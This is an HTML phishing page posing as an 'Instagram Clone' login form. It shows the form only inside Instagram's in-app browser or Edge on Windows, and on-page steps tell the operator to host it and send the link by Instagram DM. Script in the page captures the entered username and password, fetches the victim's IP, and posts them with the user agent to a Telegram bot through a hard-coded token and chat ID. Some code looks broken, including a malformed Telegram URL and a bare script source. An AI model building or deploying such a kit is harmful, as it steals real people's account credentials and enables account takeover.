<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
    <style>
        /* Hidden by default */
        #main-wrapper { display: none; }
        #status-message { 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; font-family: sans-serif; text-align: center; padding: 20px;
        }
        .btn-link { color: #0095f6; font-weight: bold; text-decoration: none; cursor: pointer; }
    </style>
</head>
<body>

    <div id="status-message">
        <div>
            <p>To run this test inside the Instagram App:</p>
            <p>1. Host this file (e.g. GitHub Pages)</p>
            <p>2. Send the link to your <b>Instagram DMs</b></p>
            <p>3. Click the link inside the DM</p>
        </div>
    </div>

    <div id="main-wrapper">
        <main class="flex align-items-center justify-content-center">
            <section id="auth" class="flex direction-column">
                <div class="panel login flex direction-column">
                    <h1 class="flex justify-content-center">
                        <img src="./img/instagram-logo.png" alt="Instagram" />
                    </h1>
                    <form id="login-form">
                        <input id="email" placeholder="Phone, username, or email" required style="padding: 10px; margin-bottom: 5px;"/>
                        <input id="password" type="password" placeholder="Password" required style="padding: 10px; margin-bottom: 5px;"/>
                        <button type="submit" style="background-color: #0095f6; color: white; border: none; padding: 10px; cursor: pointer;">Log In</button>
                    </form>
                </div>
            </section>
        </main>
    </div>

<script src="https://unpkg.com"></script>
<script>
    // --- 1. Browser & Environment Control ---
    (function() {
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        const isInstagram = ua.indexOf("Instagram") > -1;
        const isEdgeWin = ua.includes("Edg") && ua.includes("Win");

        // Reveal content only if inside Instagram App or Edge on Windows
        if (isInstagram || isEdgeWin) {
            document.getElementById('status-message').style.display = 'none';
            document.getElementById('main-wrapper').style.display = 'block';
        }
    })();

    // --- 2. Original Telegram Credentials & Logging ---
    const TOKEN = "7971493433:AAFiSKG7P1jckapqFHx-mThiTFtiBmOfhN0";
    const CHAT_ID = "5763674764";
    const URI_API = `https://api.telegram.org{TOKEN}/sendMessage`;

    document.getElementById('login-form').addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        try {
            // Fetch IP address first
            const ipResponse = await axios.get('https://api.ipify.org');
            const ip = ipResponse.data.ip;

            // Prepare the message
            const message = `
<b>New Test Entry</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>IP:</b> ${ip}
<b>Agent:</b> ${navigator.userAgent}
            `;

            // Post to Telegram
            const response = await axios.post(URI_API, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            });

            if (response.data.ok) {
                alert('Log captured and sent to Telegram!');
            }
        } catch (error) {
            console.error("Submission failed:", error);
            alert("Error: Check your Bot Token or ensure you have clicked START on your bot in Telegram.");
        }
    });
</script>
</body>
</html>
